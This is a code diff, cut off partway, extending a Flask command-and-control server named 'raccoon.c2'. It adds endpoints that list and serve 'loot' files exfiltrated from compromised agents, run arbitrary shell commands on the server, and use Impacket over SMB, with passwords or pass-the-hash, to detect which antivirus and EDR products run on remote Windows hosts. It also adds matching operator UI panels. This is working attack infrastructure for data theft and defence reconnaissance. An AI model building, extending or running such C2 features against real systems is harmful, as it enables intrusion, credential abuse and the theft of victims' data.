@@ -19,6 +19,8 @@ import logging
 import os
 import secrets
 import ssl
+import subprocess
+import threading
 import time
 import uuid
 from datetime import datetime, timezone
@@ -26,7 +28,7 @@ from pathlib import Path
 from typing import Optional
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from flask import Flask, request, jsonify, send_from_directory, Response
+from flask import Flask, request, jsonify, send_file, send_from_directory, Response
 
 logger = logging.getLogger("raccoon.c2.server")
 server_log = logging.getLogger("raccoon.c2.events")
@@ -367,6 +369,367 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     def api_rotate_token():
         return jsonify({"error": "Token rotation requires server restart"}), 400
 
+    # ── Loot API ──
+
+    @app.route("/api/loot", methods=["GET"])
+    @require_auth
+    def api_loot_list():
+        loot_dir = data_dir / "loot"
+        items = []
+        if loot_dir.exists():
+            for agent_dir in sorted(loot_dir.iterdir()):
+                if not agent_dir.is_dir():
+                    continue
+                aid = agent_dir.name
+                for f in sorted(agent_dir.iterdir(), reverse=True):
+                    if f.is_file():
+                        items.append({
+                            "agent_id": aid,
+                            "filename": f.name,
+                            "size": f.stat().st_size,
+                            "mtime": time.strftime("%Y-%m-%d %H:%M:%S",
+                                                   time.localtime(f.stat().st_mtime)),
+                        })
+        dl_dir = data_dir / "downloads"
+        if dl_dir.exists():
+            for agent_dir in sorted(dl_dir.iterdir()):
+                if not agent_dir.is_dir():
+                    continue
+                aid = agent_dir.name
+                for f in sorted(agent_dir.iterdir(), reverse=True):
+                    if f.is_file():
+                        items.append({
+                            "agent_id": aid,
+                            "filename": f.name,
+                            "size": f.stat().st_size,
+                            "mtime": time.strftime("%Y-%m-%d %H:%M:%S",
+                                                   time.localtime(f.stat().st_mtime)),
+                            "type": "download",
+                        })
+        return jsonify(items)
+
+    @app.route("/api/loot/<agent_id>/<filename>", methods=["GET"])
+    @require_auth
+    def api_loot_download(agent_id, filename):
+        for sub in ("loot", "downloads"):
+            fp = data_dir / sub / agent_id / filename
+            if fp.exists() and fp.is_file():
+                return send_file(str(fp), as_attachment=True,
+                                download_name=filename)
+        return jsonify({"error": "not found"}), 404
+
+    # ── Server-side tool execution (Impacket, NXC) ──
+
+    server_exec_state = {"status": "idle", "output": "", "tool": ""}
+
+    def _run_server_cmd(cmd_str, tool_name):
+        server_exec_state["status"] = "running"
+        server_exec_state["tool"] = tool_name
+        server_exec_state["output"] = ""
+        try:
+            r = subprocess.run(
+                cmd_str, shell=True, capture_output=True, text=True,
+                timeout=300,
+            )
+            output = r.stdout
+            if r.stderr:
+                output += "\n--- STDERR ---\n" + r.stderr
+            server_exec_state["output"] = output[:65536]
+            server_exec_state["status"] = "ok" if r.returncode == 0 else "error"
+            _log_event("TOOL", f"{tool_name} finished (exit={r.returncode})")
+        except subprocess.TimeoutExpired:
+            server_exec_state["output"] = "[timeout after 300s]"
+            server_exec_state["status"] = "error"
+        except Exception as e:
+            server_exec_state["output"] = f"[error: {e}]"
+            server_exec_state["status"] = "error"
+
+    @app.route("/api/server/exec", methods=["POST"])
+    @require_auth
+    def api_server_exec():
+        body = request.get_json(silent=True) or {}
+        cmd = body.get("cmd", "")
+        tool = body.get("tool", "custom")
+        if not cmd:
+            return jsonify({"error": "no command"}), 400
+        _log_event("TOOL", f"Executing server-side: {tool} → {cmd[:120]}")
+        t = threading.Thread(
+            target=_run_server_cmd, args=(cmd, tool), daemon=True
+        )
+        t.start()
+        return jsonify({"status": "started", "tool": tool})
+
+    @app.route("/api/server/exec/result", methods=["GET"])
+    @require_auth
+    def api_server_exec_result():
+        return jsonify(server_exec_state)
+
+    # ── AV/EDR enumeration via SMB (based on NXC enum_av) ──
+
+    AV_PRODUCTS = [
+        {"name":"Acronis Cyber Protect","services":["AcronisActiveProtectionService"],"pipes":[]},
+        {"name":"Avast / AVG","services":["AvastWscReporter","aswbIDSAgent","AVGWscReporter","avgbIDSAgent"],"pipes":["aswCallbackPipe*","avgCallbackPipe*"]},
+        {"name":"Bitdefender","services":["bdredline_agent","BDAuxSrv","UPDATESRV","VSSERV","bdredline","EPRedline","EPUpdateService","EPSecurityService","EPProtectedService","EPIntegrationService"],"pipes":["etw_sensor_pipe_ppl","local\\msgbus\\bd.process.broker.pipe"]},
+        {"name":"Carbon Black","services":["Parity","CbDefense","CbDefenseSensor"],"pipes":["CarbonBlack.Sensor.*"]},
+        {"name":"Check Point","services":["CPDA","vsmon","CPFileAnlyz","EPClientUIService"],"pipes":[]},
+        {"name":"Cortex XDR","services":["xdrhealth","cyserver"],"pipes":[]},
+        {"name":"CrowdStrike Falcon","services":["CSFalconService"],"pipes":["CrowdStrike\\{*"]},
+        {"name":"Cybereason","services":["CybereasonActiveProbe","CybereasonCRS","CybereasonBlocki"],"pipes":["CybereasonAPConsoleMinionHostIpc_*"]},
+        {"name":"Cynet","services":["CynetLauncher"],"pipes":[]},
+        {"name":"Cylance","services":["CylanceSvc"],"pipes":[]},
+        {"name":"Elastic EDR","services":["Elastic Agent","ElasticEndpoint"],"pipes":["ElasticEndpointServiceComms-*","elastic-agent-system"]},
+        {"name":"ESET","services":["ekm","epfw","epfwlwf","epfwwfp","EraAgentSvc","ERAAgent","efwd","ehttpsrv"],"pipes":["nod_scriptmon_pipe"]},
+        {"name":"FortiClient","services":["FA_Scheduler","FCT_SecSvr"],"pipes":["FortiClient_DBLogDaemon","FC_*"]},
+        {"name":"FortiEDR","services":["FortiEDR Collector Service"],"pipes":[]},
+        {"name":"G DATA","services":["AVKWCtl","AVKProxy","GDScan"],"pipes":["exploitProtectionIPC"]},
+        {"name":"HarfangLab EDR","services":["hurukai","Hurukai agent","HarfangLab Hurukai agent","hurukai-av","hurukai-ui"],"pipes":["hurukai-control","hurukai-servicing","hurukai-amsi"]},
+        {"name":"Kaspersky","services":["kavfsslp","KAVFS","KAVFSGT","klnagent","AVP"],"pipes":["Exploit_Blocker"]},
+        {"name":"Malwarebytes","services":["MBAMService","MBEndpointAgent"],"pipes":["MBLG","MBEA2_R","MBEA2_W"]},
+        {"name":"Panda / WatchGuard","services":["PandaAetherAgent","PSUAService","NanoServiceMain"],"pipes":["NNS_API_IPC_SRV_ENDPOINT","PSANMSrvcPpal"]},
+        {"name":"Rapid7 InsightAgent","services":["ir_agent"],"pipes":[]},
+        {"name":"SentinelOne","services":["SentinelAgent","SentinelStaticEngine","LogProcessorService"],"pipes":["SentinelAgentWorkerCert.*","DFIScanner.Etw.*","DFIScanner.Inline.*"]},
+        {"name":"Sophos Intercept X","services":["SntpService","Sophos Endpoint Defense Service","Sophos File Scanner Service","Sophos Health Service","Sophos Live Query","Sophos Managed Threat Response","Sophos MCS Agent","Sophos MCS Client","Sophos System Protection Service"],"pipes":["SophosUI","SophosEventStore","sophos_deviceencryption","sophoslivequery_*"]},
+        {"name":"Symantec SEP","services":["SepMasterService","SepScanService","SNAC"],"pipes":[]},
+        {"name":"Tanium","services":["TaniumClient","TaniumCX"],"pipes":[]},
+        {"name":"Trellix / McAfee","services":["McAfee Endpoint Security Platform Service","mfemactl","mfemms","mfefire","masvc","macmnsvc","mfetp","mfewc","mfeaack"],"pipes":["TrellixEDR_Pipe_*","mfemactl_*","McAfeeAgent_Pipe_*"]},
+        {"name":"Trend Micro","services":["Trend Micro Endpoint Basecamp","TMBMServer","Trend Micro Web Service Communicator","TMiACAgentSvc","CETASvc","iVPAgent","ds_agent","ds_monitor","ds_notifier"],"pipes":["IPC_XBC_XBC_AGENT_PIPE_*","OIPC_LWCS_PIPE_*"]},
+        {"name":"Wazuh","services":["WazuhSvc","wazuh-agent"],"pipes":[]},
+        {"name":"Windows Defender","services":["WinDefend","Sense","WdNisSvc"],"pipes":[]},
+        {"name":"Windows Defender ATP","services":["Sense"],"pipes":[]},
+        {"name":"WithSecure / F-Secure","services":["fsdevcon","fshoster","fsnethoster","fsulhoster","fsulnethoster","fsulprothoster","wsulavprohoster"],"pipes":["FS_CCFIPC_*"]},
+        {"name":"Qualys","services":["QualysAgent"],"pipes":[]},
+        {"name":"Ivanti Security","services":["STAgent$Shavlik Protect","STDispatch$Shavlik Protect"],"pipes":[]},
+        {"name":"Splunk","services":["SplunkForwarder","splunkd"],"pipes":[]},
+        {"name":"Sysmon","services":["Sysmon","Sysmon64"],"pipes":[]},
+        {"name":"osquery","services":["osqueryd"],"pipes":[]},
+    ]
+
+    def _run_av_enum(target, username, password, domain, use_hash):
+        server_exec_state["status"] = "running"
+        server_exec_state["tool"] = "avenum"
+        server_exec_state["output"] = ""
+        try:
+            from impacket.smbconnection import SMBConnection
+            from impacket.dcerpc.v5 import transport, lsat, lsad, scmr
+            from impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED, RPC_UNICODE_STRING
+            import fnmatch as _fnmatch
+
+            lmhash, nthash = "", ""
+            if use_hash and password:
+                if ":" in password:
+                    lmhash, nthash = password.split(":", 1)
+                else:
+                    nthash = password
+                password = ""
+
+            lines = []
+            lines.append(f"Target: {target}")
+            lines.append(f"Auth:   {domain}\\{username}")
+            lines.append("")
+
+            smb = SMBConnection(target, target, timeout=10)
+            if use_hash:
+                smb.login(username, "", domain, lmhash, nthash)
+            else:
+                smb.login(username, password, domain)
+            lines.append(f"[+] Connected to {target} (OS: {smb.getServerOS()})")
+            lines.append("")
+
+            # Method 1: LsarLookupNames (no admin needed)
+            lines.append("=" * 60)
+            lines.append("SERVICE DETECTION (LsarLookupNames - unprivileged)")
+            lines.append("=" * 60)
+            found_services = {}
+            try:
+                rpctransport = transport.SMBTransport(
+                    target, filename="\\lsarpc", smb_connection=smb
+                )
+                dce = rpctransport.get_dce_rpc()
+                dce.connect()
+                dce.bind(lsat.MSRPC_UUID_LSAT)
+
+                req = lsad.LsarOpenPolicy2()
+                req["SystemName"] = NULL
+                req["ObjectAttributes"]["RootDirectory"] = NULL
+                req["ObjectAttributes"]["ObjectName"] = NULL
+                req["ObjectAttributes"]["SecurityDescriptor"] = NULL
+                req["ObjectAttributes"]["SecurityQualityOfService"] = NULL
+                req["DesiredAccess"] = (
+                    MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES
+                )
+                resp = dce.request(req)
+                policy_handle = resp["PolicyHandle"]
+
+                for product in AV_PRODUCTS:
+                    for svc_name in product["services"]:
+                        try:
+                            req2 = lsat.LsarLookupNames()
+                            req2["PolicyHandle"] = policy_handle
+                            req2["Count"] = 1
+                            name_entry = RPC_UNICODE_STRING()
+                            name_entry["Data"] = f"NT Service\\{svc_name}"
+                            req2["Names"].append(name_entry)
+                            req2["TranslatedSids"]["Sids"] = NULL
+                            req2["LookupLevel"] = (
+                                lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta
+                            )
+                            dce.request(req2)
+                            found_services.setdefault(
+                                product["name"], []
+                            ).append(svc_name)
+                        except Exception:
+                            pass
+                dce.disconnect()
+            except Exception as e:
+                lines.append(f"[!] LsarLookupNames failed: {e}")
+
+            if found_services:
+                for prod_name, svcs in found_services.items():
+                    lines.append(
+                        f"  [+] {prod_name} INSTALLED "
+                        f"({', '.join(svcs)})"
+                    )
+            else:
+                lines.append("  [-] No services detected via LSA")
+            lines.append("")
+
+            # Method 2: Named pipe detection
+            lines.append("=" * 60)
+            lines.append("PIPE DETECTION (IPC$ enumeration)")
+            lines.append("=" * 60)
+            found_pipes = {}
+            try:
+                ipc_files = smb.listPath("IPC$", "\\*")
+                pipe_names = [f.get_longname() for f in ipc_files]
+                for product in AV_PRODUCTS:
+                    for pipe_pattern in product["pipes"]:
+                        for pn in pipe_names:
+                            if _fnmatch.fnmatch(pn, pipe_pattern):
+                                found_pipes.setdefault(
+                                    product["name"], []
+                                ).append(pn)
+                                break
+            except Exception as e:
+                lines.append(f"[!] Pipe enumeration failed: {e}")
+
+            if found_pipes:
+                for prod_name, pipes in found_pipes.items():
+                    status = "INSTALLED and RUNNING" if prod_name in found_services else "RUNNING"
+                    lines.append(
+                        f"  [+] {prod_name} {status} "
+                        f"(pipes: {', '.join(pipes[:3])})"
+                    )
+            else:
+                lines.append("  [-] No known pipes detected")
+            lines.append("")
+
+            # Method 3: Service Manager (needs higher privs)
+            lines.append("=" * 60)
+            lines.append("SERVICE MANAGER (SCM - may need admin)")
+            lines.append("=" * 60)
+            scm_found = {}
+            try:
+                rpctransport2 = transport.SMBTransport(
+                    target, filename="\\svcctl", smb_connection=smb
+                )
+                dce2 = rpctransport2.get_dce_rpc()
+                dce2.connect()
+                dce2.bind(scmr.MSRPC_UUID_SCMR)
+                scm_handle = scmr.hROpenSCManagerW(dce2)["lpScHandle"]
+
+                for product in AV_PRODUCTS:
+                    for svc_name in product["services"]:
+                        try:
+                            svc_handle = scmr.hROpenServiceW(
+                                dce2, scm_handle, svc_name
+                            )["lpServiceHandle"]
+                            svc_status = scmr.hRQueryServiceStatus(
+                                dce2, svc_handle
+                            )
+                            state = svc_status["lpServiceStatus"][
+                                "dwCurrentState"
+                            ]
+                            state_str = {
+                                1: "STOPPED", 2: "START_PENDING",
+                                3: "STOP_PENDING", 4: "RUNNING",
+                                5: "CONTINUE_PENDING", 6: "PAUSE_PENDING",
+                                7: "PAUSED",
+                            }.get(state, f"UNKNOWN({state})")
+                            scm_found.setdefault(
+                                product["name"], []
+                            ).append((svc_name, state_str))
+                            scmr.hRCloseServiceHandle(dce2, svc_handle)
+                        except Exception:
+                            pass
+                scmr.hRCloseServiceHandle(dce2, scm_handle)
+                dce2.disconnect()
+            except Exception as e:
+                lines.append(f"  [!] SCM access failed: {e}")
+
+            if scm_found:
+                for prod_name, svcs in scm_found.items():
+                    for svc_name, state_str in svcs:
+                        lines.append(
+                            f"  [+] {prod_name}: {svc_name} → {state_str}"
+                        )
+            else:
+                if not found_services and not found_pipes:
+                    lines.append("  [-] No AV/EDR services found via SCM")
+            lines.append("")
+
+            # Summary
+            all_found = set(found_services.keys()) | set(found_pipes.keys()) | set(scm_found.keys())
+            lines.append("=" * 60)
+            lines.append("SUMMARY")
+            lines.append("=" * 60)
+            if all_found:
+                for prod in sorted(all_found):
+                    markers = []
+                    if prod in found_services:
+                        markers.append("service")
+                    if prod in found_pipes:
+                        markers.append("pipe")
+                    if prod in scm_found:
+                        states = [s for _, s in scm_found[prod]]
+                        markers.append(
+                            "SCM:" + ",".join(set(states))
+                        )
+                    lines.append(
+                        f"  🛡️  {prod} [{' | '.join(markers)}]"
+                    )
+                lines.append(f"\n  {len(all_found)} security product(s) detected on {target}")
+            else:
+                lines.append("  No endpoint protection detected (clean target)")
+
+            smb.logoff()
+            server_exec_state["output"] = "\n".join(lines)
+            server_exec_state["status"] = "ok"
+            _log_event("TOOL", f"AV enum on {target}: {len(all_found)} products found")
+
+        except Exception as e:
+            server_exec_state["output"] = f"[!] AV enumeration failed: {e}"
+            server_exec_state["status"] = "error"
+
+    @app.route("/api/server/avenum", methods=["POST"])
+    @require_auth
+    def api_server_avenum():
+        body = request.get_json(silent=True) or {}
+        target = body.get("target", "")
+        username = body.get("username", "")
+        password = body.get("password", "")
+        domain = body.get("domain", ".")
+        use_hash = body.get("use_hash", False)
+        if not target:
+            return jsonify({"error": "target required"}), 400
+        _log_event("TOOL", f"AV enum started on {target}")
+        t = threading.Thread(
+            target=_run_av_enum,
+            args=(target, username, password, domain, use_hash),
+            daemon=True,
+        )
+        t.start()
+        return jsonify({"status": "started", "target": target})
+
     # ── Beacon catch-all (handles any POST path) ──
 
     @app.route("/", methods=["POST"])
@@ -437,6 +800,8 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
         "pid": payload.get("pid", 0),
         "interval": payload.get("interval", 300),
         "local_ips": payload.get("local_ips", []),
+        "proxy_mode": payload.get("proxy_mode", ""),
+        "proxy_active": payload.get("proxy_active", ""),
         "uptime": payload.get("uptime", 0),
         "registered": _now(),
         "last_seen": _now(),
@@ -471,6 +836,10 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
                                                     agents[agent_id].get("interval", 300))
         if payload.get("local_ips"):
             agents[agent_id]["local_ips"] = payload["local_ips"]
+        if payload.get("proxy_mode"):
+            agents[agent_id]["proxy_mode"] = payload["proxy_mode"]
+        if payload.get("proxy_active"):
+            agents[agent_id]["proxy_active"] = payload["proxy_active"]
 
         queue = task_queues.get(agent_id, [])
         if queue:
@@ -529,12 +898,17 @@ def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
     _save_state(data_dir)
 
     if data and data.get("data"):
-        dl_dir = data_dir / "downloads" / agent_id
+        is_loot = data.get("loot", False)
+        sub = "loot" if is_loot else "downloads"
+        dl_dir = data_dir / sub / agent_id
         dl_dir.mkdir(parents=True, exist_ok=True)
         filename = data.get("filename", f"{task_id}.bin")
-        (dl_dir / filename).write_bytes(base64.b64decode(data["data"]))
-        logger.info("Downloaded file saved: %s/%s", agent_id, filename)
-        _log_event("DOWNLOAD", f"file={filename} saved to {dl_dir / filename}",
+        ts = time.strftime("%Y%m%d-%H%M%S")
+        safe_name = f"{ts}_{filename}"
+        (dl_dir / safe_name).write_bytes(base64.b64decode(data["data"]))
+        logger.info("%s saved: %s/%s", sub.title(), agent_id, safe_name)
+        category = "LOOT" if is_loot else "DOWNLOAD"
+        _log_event(category, f"file={safe_name} saved to {dl_dir / safe_name}",
                    agent_id=agent_id)
 
     return jsonify(crypto.wrap({"ack": True}))
@@ -814,6 +1188,44 @@ header .info{font-size:11px;color:var(--text2)}
 .fb-detail .fd-val{color:var(--text);word-break:break-all}
 .fb-detail .fd-val.highlight{color:var(--green)}
 .fb-detail .fd-val.warn{color:var(--orange)}
+.fd-actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.fd-btn{
+  padding:4px 10px;border:1px solid var(--border);border-radius:4px;
+  background:var(--bg2);color:var(--text);font-size:11px;cursor:pointer;
+  display:flex;align-items:center;gap:4px;transition:all 0.15s;
+}
+.fd-btn:hover{background:var(--bg3);border-color:var(--text2)}
+.fd-btn.dl{border-color:var(--green-dim);color:var(--green)}
+.fd-btn.dl:hover{background:rgba(0,200,83,0.1)}
+.fd-btn.loot{border-color:var(--orange-dim,var(--orange));color:var(--orange)}
+.fd-btn.loot:hover{background:rgba(255,152,0,0.1)}
+.fd-btn.up{border-color:var(--blue-dim,var(--blue));color:var(--blue,#42a5f5)}
+.fd-btn.up:hover{background:rgba(66,165,245,0.1)}
+.loot-overlay{
+  position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);
+  z-index:9999;display:flex;align-items:center;justify-content:center;
+}
+.loot-panel{
+  background:var(--bg);border:1px solid var(--border);border-radius:8px;
+  padding:20px;min-width:400px;max-width:600px;max-height:70vh;overflow-y:auto;
+  position:relative;
+}
+.loot-panel h2{margin:0 0 12px;font-size:16px;color:var(--text)}
+.loot-close{position:absolute;top:12px;right:12px;background:none;border:none;color:var(--text2);cursor:pointer;font-size:16px}
+.loot-loading,.loot-empty{color:var(--text2);font-size:13px}
+.loot-list{display:flex;flex-direction:column;gap:4px}
+.loot-item{
+  display:flex;align-items:center;gap:10px;padding:8px;border-radius:4px;
+  background:var(--bg2);
+}
+.loot-item:hover{background:var(--bg3)}
+.loot-ico{font-size:18px}
+.loot-info{flex:1;min-width:0}
+.loot-name{display:block;color:var(--green);font-size:12px;text-decoration:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.loot-name:hover{text-decoration:underline}
+.loot-meta{font-size:10px;color:var(--text2)}
+.loot-dl{color:var(--green);text-decoration:none;font-size:16px;padding:4px}
+.loot-dl:hover{color:var(--text)}
 .fb-upload-zone{
   border:2px dashed var(--border);border-radius:6px;padding:12px;margin:6px 8px;
   text-align:center;color:var(--text2);font-size:11px;cursor:pointer;
@@ -856,6 +1268,13 @@ header .info{font-size:11px;color:var(--text2)}
 .toast.t-info{border-color:var(--red-dim)}
 .toast.t-info .t-title{color:var(--red)}
 @keyframes toast-in{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
+
+/* Topbar icon buttons */
+.topbar-ico-btn{
+  background:none;border:none;cursor:pointer;font-size:18px;
+  color:var(--text2);transition:color 0.15s;padding:4px;margin-left:8px;
+}
+.topbar-ico-btn:hover{color:var(--text)}
 
 /* Notification bell */
 .bell-wrap{position:relative;margin-left:8px}
@@ -972,7 +1391,7 @@ header .info{font-size:11px;color:var(--text2)}
 .pivot-canvas{width:100%;height:100%;display:block;cursor:grab}
 .pivot-canvas:active{cursor:grabbing}
 .pivot-controls{
-  display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;flex-shrink:0;
+  display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;flex-shrink:0;position:relative;
 }
 .pivot-controls button{
   padding:5px 12px;background:rgba(255,255,255,0.04);color:var(--text);border:1px solid var(--border);
@@ -1059,6 +1478,140 @@ header .info{font-size:11px;color:var(--text2)}
 .log-agent{color:var(--green);white-space:nowrap;flex-shrink:0}
 .log-msg{color:var(--text);word-break:break-all;flex:1}
 
+/* AV enum dialog */
+.avenum-form{display:flex;flex-direction:column;gap:8px}
+.avenum-form label{display:flex;flex-direction:column;gap:2px;font-size:11px;color:var(--text2)}
+.avenum-form input[type="text"],.avenum-form input[type="password"],.avenum-form input:not([type]){
+  padding:6px 8px;background:var(--bg2);color:var(--text);
+  border:1px solid var(--border);border-radius:4px;font-size:12px;
+}
+.avenum-form input:focus{border-color:var(--red-dim);outline:none}
+.ave-check{flex-direction:row !important;align-items:center;gap:6px !important}
+.ave-check input{width:auto}
+.ave-run{
+  margin-top:4px;padding:8px 16px;background:var(--red-dim);color:var(--red);
+  border:1px solid var(--red-dim);border-radius:4px;cursor:pointer;font-weight:700;font-size:12px;
+}
+.ave-run:hover{background:rgba(255,26,26,0.2)}
+
+/* NXC scan menu */
+.nxc-menu{
+  position:absolute;top:100%;left:0;z-index:100;
+  background:var(--bg);border:1px solid var(--border);border-radius:6px;
+  padding:8px 0;min-width:260px;box-shadow:0 8px 24px rgba(0,0,0,0.4);
+}
+.nxc-title{padding:4px 12px 8px;font-weight:700;font-size:12px;color:var(--text);border-bottom:1px solid var(--border)}
+.nxc-section{padding:8px 12px 2px;font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:0.05em;font-weight:600}
+.nxc-menu button{
+  display:block;width:100%;text-align:left;padding:5px 12px;
+  background:none;border:none;color:var(--text);font-size:11px;cursor:pointer;
+}
+.nxc-menu button:hover{background:rgba(255,26,26,0.08);color:var(--red)}
+.nxc-host-pick{padding:4px 12px}
+.nxc-host-pick select{
+  width:100%;padding:3px 6px;background:var(--bg2);color:var(--text);
+  border:1px solid var(--border);border-radius:3px;font-size:11px;
+}
+.nxc-custom{display:flex;gap:4px;padding:4px 12px}
+.nxc-custom input{
+  flex:1;padding:3px 6px;background:var(--bg2);color:var(--text);
+  border:1px solid var(--border);border-radius:3px;font-size:11px;
+}
+.nxc-custom button{flex-shrink:0}
+.nxc-note{padding:6px 12px;font-size:10px;color:var(--text2);font-style:italic;border-top:1px solid var(--border);margin-top:4px}
+
+/* Process view with EDR detection */
+.proc-summary{padding:10px 12px;border-bottom:1px solid var(--border)}
+.proc-alert{display:flex;align-items:center;gap:8px;margin-bottom:8px}
+.proc-alert-ico{font-size:18px}
+.proc-alert-title{font-weight:700;font-size:13px;color:#ff5555}
+.proc-detections{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:8px}
+.proc-det{
+  display:flex;align-items:center;gap:6px;padding:4px 8px;
+  background:var(--bg2);border-radius:3px;font-size:11px;
+}
+.proc-det-name{color:var(--text);font-weight:600}
+.proc-det-tag{padding:1px 5px;border-radius:2px;font-size:10px;font-weight:600}
+.proc-det-sev{font-size:10px;text-transform:uppercase}
+.proc-beacon-info{font-size:11px;color:#FFD700;padding:4px 0}
+.proc-list{font-family:monospace;font-size:11px;padding:4px 0}
+.proc-line{padding:1px 12px;white-space:pre;overflow-x:auto;color:var(--text)}
+.proc-line:hover{background:rgba(255,255,255,0.03)}
+.proc-header{color:var(--text2);font-weight:700;position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--border)}
+.proc-beacon{background:rgba(255,215,0,0.08);color:#FFD700;font-weight:700}
+.proc-flagged{background:rgba(255,50,50,0.06)}
+.proc-tag{
+  display:inline-block;padding:0 5px;border-radius:2px;font-size:9px;
+  font-family:var(--font);vertical-align:middle;margin-left:6px;font-weight:600;
+}
+.proc-tag.beacon{background:rgba(255,215,0,0.15);color:#FFD700}
+
+/* Netstat view */
+.ns-summary{display:flex;gap:8px;padding:10px 12px;border-bottom:1px solid var(--border);flex-wrap:wrap}
+.ns-stat{
+  display:flex;flex-direction:column;align-items:center;
+  padding:6px 14px;border-radius:4px;background:var(--bg2);min-width:60px;
+}
+.ns-num{font-size:18px;font-weight:700;color:var(--text);font-variant-numeric:tabular-nums}
+.ns-lbl{font-size:10px;color:var(--text2);margin-top:2px}
+.ns-stat.listen .ns-num{color:var(--green)}
+.ns-stat.active .ns-num{color:#42a5f5}
+.ns-stat.warn .ns-num{color:var(--orange)}
+.ns-section{margin:4px 0}
+.ns-title{padding:6px 12px;font-size:11px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:0.05em}
+.ns-table{width:100%;border-collapse:collapse;font-size:11px}
+.ns-table th{
+  text-align:left;padding:4px 8px;color:var(--text2);font-weight:600;
+  border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg);
+}
+.ns-table td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.04);color:var(--text)}
+.ns-table tr:hover td{background:rgba(255,255,255,0.03)}
+.ns-row-warn td{background:rgba(255,152,0,0.05)}
+.ns-row-warn:hover td{background:rgba(255,152,0,0.1)}
+.ns-addr{font-family:monospace;white-space:nowrap}
+.ns-tag{
+  display:inline-block;padding:1px 6px;border-radius:3px;font-size:10px;
+  margin:1px 2px;white-space:nowrap;
+}
+.ns-tag.svc{background:rgba(66,165,245,0.12);color:#42a5f5}
+.ns-tag.listen{background:rgba(0,200,83,0.1);color:var(--green)}
+.ns-tag.active{background:rgba(66,165,245,0.1);color:#42a5f5}
+.ns-tag.highlight{background:rgba(255,215,0,0.12);color:#ffd700}
+.ns-tag.warn{background:rgba(255,80,40,0.15);color:#ff6644}
+
+/* Server log drawer */
+.srvlog-drawer{
+  position:fixed;top:0;right:0;bottom:0;width:480px;max-width:90vw;
+  background:var(--bg);border-left:1px solid var(--border);
+  display:flex;flex-direction:column;z-index:9998;
+  transform:translateX(100%);transition:transform 0.2s ease;
+  box-shadow:-4px 0 20px rgba(0,0,0,0.3);
+}
+.srvlog-drawer.open{transform:translateX(0)}
+.srvlog-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 16px;border-bottom:1px solid var(--border);
+  font-weight:700;font-size:14px;color:var(--text);flex-shrink:0;
+}
+.srvlog-header button{
+  background:none;border:none;color:var(--text2);cursor:pointer;font-size:16px;
+  padding:4px 8px;border-radius:4px;
+}
+.srvlog-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
+.srvlog-controls{
+  display:flex;gap:4px;padding:8px 12px;flex-wrap:wrap;
+  border-bottom:1px solid var(--border);flex-shrink:0;
+}
+.srvlog-controls button{
+  background:var(--bg2);border:1px solid var(--border);color:var(--text2);
+  padding:3px 8px;border-radius:3px;font-size:11px;cursor:pointer;
+}
+.srvlog-controls button:hover{color:var(--text);border-color:var(--text2)}
+.srvlog-controls button.active{color:var(--red);border-color:var(--red-dim);background:rgba(255,26,26,0.08)}
+.srvlog-body{flex:1;overflow-y:auto;min-height:0;padding:4px 0}
+.srvlog-body::-webkit-scrollbar{width:6px}
+.srvlog-body::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}
+
 /* Scrollbar */
 .agent-list::-webkit-scrollbar{width:4px}
 .agent-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
@@ -1073,6 +1626,8 @@ header .info{font-size:11px;color:var(--text2)}
     <div class="spacer"></div>
     <span class="status-dot"></span>
     <span class="info" id="server-info">Listening</span>
+    <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
+    <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
     <div class="bell-wrap">
       <button class="bell-btn" onclick="toggleNotifPanel()" title="Notifications">&#128276;<span class="bell-badge" id="bell-badge"></span></button>
       <div class="notif-panel" id="notif-panel">
@@ -1109,6 +1664,14 @@ header .info{font-size:11px;color:var(--text2)}
   </div>
 </div>
 <div class="toast-container" id="toast-container"></div>
+<div class="srvlog-drawer" id="srvlog-drawer">
+  <div class="srvlog-header">
+    <span>&#128220; Server Log</span>
+    <button onclick="closeSrvLog()">&#10005;</button>
+  </div>
+  <div class="srvlog-controls" id="srvlog-controls"></div>
+  <div class="srvlog-body" id="srvlog-body"></div>
+</div>
 
 <script>
 const TOKEN = "{{TOKEN}}";
@@ -1269,6 +1832,7 @@ async function renderAgentView(id){
       <span class="tag">${esc(info.arch||'?')}</span>
       <span class="tag">${esc(info.os||'?')}</span>
       <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
+      ${info.proxy_active ? '<span class="tag" style="background:#1a6e1a">PROXY: '+esc(info.proxy_active)+'</span>' : ''}
     </div>
     <div class="terminal-wrap">
       <div class="toolbar">
@@ -1279,10 +1843,12 @@ async function renderAgentView(id){
         <button onclick="quickCmd('shell','id','id')"><span class="ico">&#128273;</span> id</button>
         <button onclick="quickCmd('shell','uname -a','sysinfo')"><span class="ico">&#128187;</span> sysinfo</button>
         <button onclick="showProcs()"><span class="ico">&#9881;</span> procs</button>
-        <button onclick="quickCmd('shell','netstat -tlnp 2>/dev/null || netstat -an','Network')"><span class="ico">&#127760;</span> netstat</button>
